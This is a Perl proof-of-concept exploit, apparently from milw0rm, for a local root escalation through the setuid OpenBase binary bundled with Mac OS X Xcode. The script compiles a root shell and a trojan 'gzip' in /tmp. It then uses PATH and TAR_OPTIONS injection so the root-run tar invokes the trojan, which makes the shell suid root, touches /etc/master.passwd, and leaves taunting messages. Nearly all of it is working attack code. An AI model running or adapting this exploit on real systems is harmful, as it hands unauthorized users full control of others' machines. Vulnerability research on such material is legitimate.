#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# http://docs.info.apple.com/article.html?artnum=61798 (This won't help)
# ftp://www.openbase.com/pub/OpenBase_10.0 (This will)
#
# This is an exploit for a 3rd party program that has been bundled with Xcode on several occasions. 
# The OpenBase binary calls gnutar while running with euid=0 by passing TAR_OPTIONS we can cause gzip to be 
# invoked. Since no path is specified we can export PATH=/path/to/trojan:$PATH in order to take root.

$binpath = "/Library/OpenBase/bin/OpenBase"; # Typical location. 

# In this instance targets are really pointless but I wanted to archive known vulnerable versions while testing. 
$tgts{"0"} = "xcode_2-1.2_8m654_018213974.dmg:$binpath ";
$tgts{"1"} = "OpenBase9.1.5_MacOSX.dmg:$binpath ";
$tgts{"2"} = "OpenBase8.0.4_MacOSX.dmg:$binpath ";
$tgts{"3"} = "OpenBase7.0.15_MacOSX.dmg:$binpath ";

unless (($target) = @ARGV) {
        print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key . $a\n";
        }

        print "\n";
        exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a $b\n";

open(OP,">/tmp/proactive.c");
printf OP "main()\n"; 
printf OP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/sh -i\"); }\n";
system("gcc -o /tmp/shX /tmp/proactive.c"); 

open(OP,">/tmp/or_really_reactive.c");
printf OP "main()\n"; 
printf OP "{ system(\"chown root: /tmp/shX; chmod 4755 /tmp/shX; rm -rf /tmp/or_really_reactive.c /tmp/proactive.c /tmp/pwndertino.* /tmp/gzip\"); }\n";
system("gcc -o /tmp/gzip /tmp/or_really_reactive.c"); 

system("mkdir /tmp/pwndertino.db");
system("echo \"Way to proactively audit 3rd party binaries before cramming them into a release \"> /tmp/pwndertino.db/port");
system("echo \"I wonder how long these vulnerable suids have been bundled with xcode \"> /tmp/pwndertino.db/encoding");
system("echo \"All your Mac are belong to us \"> /tmp/pwndertino.db/threads");
system("echo \"Welcome to pwndertino \"> /tmp/pwndertino.db/notification");
system("echo \"For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available \"> /tmp/pwndertino.db/simulationMode");
system("echo \"To learn more about Apple Product Security, see the Apple Computer Product Security Incident Response website\" > /tmp/pwndertino.db/safe_sql_mode");

system("export TAR_OPTIONS=\"-zv /etc/master.passwd\"; export PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin;$b ../../../../../../tmp/pwndertino");

system("/tmp/shX");

# milw0rm.com [2006-10-15]